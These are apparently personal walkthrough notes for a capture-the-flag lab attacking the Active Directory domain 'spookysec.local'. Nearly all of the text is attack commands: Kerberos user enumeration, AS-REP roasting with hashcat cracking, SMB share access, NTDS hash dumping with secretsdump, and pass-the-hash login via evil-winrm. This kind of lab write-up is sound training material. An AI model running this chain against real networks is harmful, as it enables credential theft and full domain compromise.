##Machine Details
ipaddr=10.10.204.84

##Pre Reqs
git clone https://github.com/SecureAuthCorp/impacket.git
pip3 install -r requirements.txt
python3 setup.py install

apt install bloodhound neo4j
pip3 install bloodhound

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
#wordlists
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

##Enumeration

nmap scan
> nmap 10.10.204.84 -vvv -Pn -sV -oN nmap-output.txt

narrow it down to open ports.
> nmap 10.10.204.84 -vvv -p 135,139,445,88,3389 -sC -sV -oN nmap-script-scan.txt

use enum4linux
> enum4linux -a ip

##Kerberos 
./kerbrute userenum --dc 10.10.204.84 -d spookysec.local userlist.txt

found usernames saved to kerbrute-usernames.txt

##Abusing Kerberos

Using the list from kerbrute

> python3 impacket/examples/GetNPUsers.py spookysec.local/ -usersfile kerbrute-usernames.txt -format hashcat -outputfile impacket-getnpusers.txt

identify the hash at https://hashcat.net/wiki/doku.php?id=example_hashes

> hashcat -h 
find Kerberos 5

> hashcat -m 18200 impacket-getnpusers.txt passwordlist.txt --force

save output to hashcat-results.txt

##Back to enumeration
Using smbclient and found password

list shares
> smbclient -L 10.10.204.84 -U 'spookeysec.local\svc-admin'

connect to a share
> smbclient //10.10.204.84/backup -U 'spookeysec.local\svc-admin'
ls to show contents
use >more to view contents of txt file

find hashtype - base64
decode online to view contents

save to file

##Domain privileges escalation

using secretsdump.py get the ntds.dit

> python3 impacket/examples/secretsdump.py -just-dc-ntlm  spookysec.local/backup@10.10.204.84

save output to file

Evil-WinRM to use hash to log in.

##flags

Use Evil-WinRM to get the flags using the hashes collected

evil-winrm -i 10.10.204.84 -u administrator -H cb4fc
 and so on
